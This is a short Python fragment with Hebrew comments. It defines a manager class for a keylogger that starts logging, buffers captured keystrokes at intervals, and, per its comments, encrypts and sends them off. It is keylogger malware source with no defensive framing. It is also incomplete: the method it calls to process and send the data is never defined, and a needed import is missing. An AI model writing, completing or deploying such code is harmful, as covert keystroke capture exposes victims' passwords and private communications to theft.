class KeyLoggerManager:
    def __init__(self, keylogger_service, file_writer, encryptor, interval=5):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.encryptor = encryptor
        self.interval = interval  # כל כמה שניות לאסוף
        self.buffer = []  # מאגר ביניים לשמירת ההקלדות
        self.running = False
    def collect_keys(self):
        keys = self.keylogger_service.get_logged_keys()
        if keys:
            self.buffer.extend(keys)
            self.keylogger_service.clear_logged_keys()  # פונקציה אופציונלית שתאפס את הלוג


    def start(self):
        self.running = True
        self.keylogger_service.start_logging()
        while self.running:
            time.sleep(self.interval)
            self.process_and_send()

    def stop(self):
        self.running = False
        self.process_and_send()  # שולח את מה שנשאר לפני עצירה
        self.keylogger_service.stop_logging()

